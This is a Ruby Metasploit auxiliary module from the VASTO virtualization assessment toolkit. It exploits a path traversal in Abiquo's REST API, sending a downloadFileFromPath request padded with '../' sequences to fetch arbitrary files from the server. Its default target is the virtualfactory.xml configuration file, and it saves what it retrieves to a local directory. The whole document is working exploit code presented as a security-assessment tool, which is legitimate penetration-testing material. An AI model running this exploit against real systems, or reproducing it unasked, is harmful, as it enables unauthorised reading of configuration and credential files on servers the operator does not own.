#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#								#
#################################################################


require 'msf/core'
require "open-uri"

class Metasploit3 < Msf::Auxiliary  
  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  
  def initialize
    super(
			'Name'        => 'Abiquo Guest Stealer',
			'Version'     => 'Abiquo Guest Stealer 0.1',
			'Description' => 'This module will expoloit a path traversal in Abiquo am rest
					  APIs to retrieve files on the remote system under the tomcat user',
			'Author'      => 'Claudio Criscione <c.criscione@securenetwork.it>',
			'License'     =>  GPL_LICENSE 
    )
      
    deregister_options('VHOST')
    register_options(
      [
        Opt::RPORT(8080),
	OptString.new('FILE', [true, "File to retrieve","/opt/abiquo-server/config/virtualfactory.xml"]),
	OptString.new('LOCALDIR', [true, "Local directory where files are saved", "/tmp/"]),
	OptString.new('RepoPath', [true, "Set the path to the repository to grab host list", "/opt/vm_repository/1/httpabispace.s3.amazonaws.com"])
      ], self.class)
  end
  
  def run
    begin
      target = datastore['TARGET']
      dir = datastore['LOCALDIR']
      port = datastore['RPORT']
      ssl = datastore['SSL']
      ip = datastore['RHOST']     
      do_file(ip,target,dir,port,ssl,dir)       
    end
  end
  

    
    
   #retrieves a given file or guest
   def do_file(ip,target,dir,port,ssl,ldir)
     begin
	file = URI.escape(datastore['FILE'])
        
	#Building the url
	if(ssl)
	  @baseuri = 'https://'
	else
	  @baseuri = 'http://'
	end
	@baseuri << ip
	@baseuri << ':' + port
	@baseuri << "/am/rest_AM/downloadFileFromPath/?imagePath=../../../../../../../../../../"
	uri = @baseuri + file	

	download_file(uri,ldir) 
	
	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
	rescue ::Timeout::Error, ::Errno::EPIPE    
     end
   end
   
   
   
   #Download given file
   def download_file(uri,ldir)
     begin
	print_status("Dowloading requested file!")
	#Downloading the file
	open(uri, 
	     :content_length_proc => lambda {|t|
		if t && 0 < t
		  @size = t
	          @dstatus = 0
		end
	      },
	    :progress_proc => lambda {|s| #handling statusbar
		if((s*100 / @size) - 10  > @dstatus) 
		   @dstatus = (s*100 / @size)
		   print_status("#@dstatus % completed")
	       end
	     }
	  ) do |fin|
           open(ldir + URI.unescape(File.basename(uri)), "w") do |fout|
             #while (buf = fin.read(8192))
	     i=0
	     while (buf = fin.gets)
	       #here we have to jump the first 8 lines
		i=i+1
		if(i>8) then
		    if(!fin.eof) then #This way we remove the last line
		      fout.write buf
		    end
		end
             end
           end
         end
     end
   end
      
end